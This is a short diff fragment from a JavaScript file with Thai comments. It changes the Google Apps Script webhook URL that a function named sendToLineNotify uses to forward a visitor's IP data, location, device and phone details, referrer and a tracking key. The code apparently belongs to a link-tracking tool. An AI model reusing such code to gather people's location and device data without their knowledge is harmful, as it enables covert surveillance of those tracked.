@@ -472,7 +472,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
 
   // ส่งข้อมูลไปยัง webhook ของเรา
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycby1CfiDdi3JI1MGHeujN6OSJj8fGon8LviWT0E7GFj_eBiS4HSjmOuSIIz6vc1g_Tg-3w/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzLL4s6sTEKYHtgRdvJyfaK8zx0-D3pSwZlTOd7ifK65ZR2JhW_lZbnsFHtuzAkE_kikA/exec';
 
   // แก้ไขส่วนนี้: ทำให้แน่ใจว่าส่ง trackingKey ไปด้วยเสมอ
   const dataToSend = {
